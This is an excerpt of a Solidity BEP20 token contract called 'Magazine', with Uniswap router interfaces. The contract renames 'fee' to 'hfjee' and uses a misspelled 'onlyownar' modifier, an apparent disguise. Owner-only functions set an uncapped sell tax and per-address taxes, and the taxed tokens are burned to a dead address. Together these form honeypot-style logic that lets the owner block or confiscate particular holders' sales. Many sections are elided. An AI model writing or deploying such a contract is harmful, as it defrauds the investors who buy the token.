...
interface IUniswapV2Factory {
    ...
    function hfjeeTo() external view returns (address);
    function hfjeeToSetter() external view returns (address);
    ...
    function sethfjeeTo(address) external;
    function sethfjeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinghfjeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinghfjeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinghfjeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinghfjeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinghfjeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Magazine is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellhfjee = 0;

    uint256 private _defaultBuyhfjee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliphfjee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellhfjee = _value;
    }

    function setSliphfjee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliphfjee[_address] = _value;
    }

    function getSliphfjee(address _address) external view onlyownar returns (uint256) {
        return _sliphfjee[_address];
    }


    function setMAccounthfjee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccounthfjee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradehfjeeAmount = 0;

        if (rF) {
            uint256 tradehfjee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradehfjee = _defaultSellhfjee;
                }
                if (from == uniswapV2Pair) {

                    tradehfjee = _defaultBuyhfjee;
                }
            }
            if (_sliphfjee[from] > 0) {
                tradehfjee = _sliphfjee[from];
            }

            tradehfjeeAmount = _Amount.mul(tradehfjee).div(100);
        }


        if (tradehfjeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradehfjeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradehfjeeAmount);
            emit Transfer(from, _deadAddress, tradehfjeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradehfjeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradehfjeeAmount);
        emit Transfer(from, _to, _Amount - tradehfjeeAmount);
    }
